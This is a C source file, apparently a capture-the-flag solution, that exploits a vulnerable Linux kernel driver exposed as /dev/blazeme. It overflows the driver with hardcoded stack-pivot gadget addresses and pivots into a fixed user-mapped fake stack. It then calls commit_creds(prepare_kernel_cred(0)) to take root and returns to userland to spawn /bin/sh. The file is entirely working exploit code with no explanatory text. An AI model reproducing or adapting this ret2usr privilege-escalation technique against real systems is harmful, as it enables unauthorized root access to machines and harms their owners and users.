#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

static void shell();
static void kernel_payload();

int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

static void escalate_privs() { commit_creds(prepare_kernel_cred(0)); }

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "pushfq\n"
      "popq %2\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
      :
      : "memory");
}

static void restore_state() {
  asm volatile(
      "swapgs ;"
      "movq %0, 0x20(%%rsp)\t\n"
      "movq %1, 0x18(%%rsp)\t\n"
      "movq %2, 0x10(%%rsp)\t\n"
      "movq %3, 0x08(%%rsp)\t\n"
      "movq %4, 0x00(%%rsp)\t\n"
      "iretq"
      :
      : "r"(user_ss), "r"((unsigned long)0x1740000), "r"(user_rflags), "r"(user_cs), "r"(shell));
}

static void kernel_payload() {
  escalate_privs();
  restore_state();
}

static void shell() {
  printf("Spawning shell\n");
  system("/bin/sh");
  exit(0);
}

int main() {
  commit_creds = (void *)0xffffffff81063960ull;
  prepare_kernel_cred = (void *)0xffffffff81063b50ull;
  save_state();

  unsigned long *fake_stack = mmap((void *)0x1700000, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
  fake_stack[0x40000 / 8] = (unsigned long)kernel_payload;

  unsigned long pivot[8];
  for (int i = 0; i < 8; ++i) {
    pivot[i] = 0xffffffff8109c604ull;  // mov esp, 0x1740000; ret;
  }

  char payload[64];
  strncpy(payload, "AA", 2);
  strncpy(&payload[2], (const char *)pivot, 62);

  int fd = open("/dev/blazeme", O_RDWR);
  for (;;) {
    write(fd, payload, 64);;
  }
  return 0;
}
